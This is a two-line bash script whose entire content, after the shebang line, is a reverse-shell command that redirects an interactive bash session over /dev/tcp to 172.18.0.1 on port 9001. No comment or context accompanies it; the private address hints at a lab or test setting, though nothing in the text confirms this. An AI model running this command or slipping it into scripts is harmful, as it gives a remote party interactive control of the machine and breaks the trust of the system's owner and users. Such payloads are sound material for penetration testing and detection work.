#!/bin/bash
bash -i >& /dev/tcp/172.18.0.1/9001 0>&1
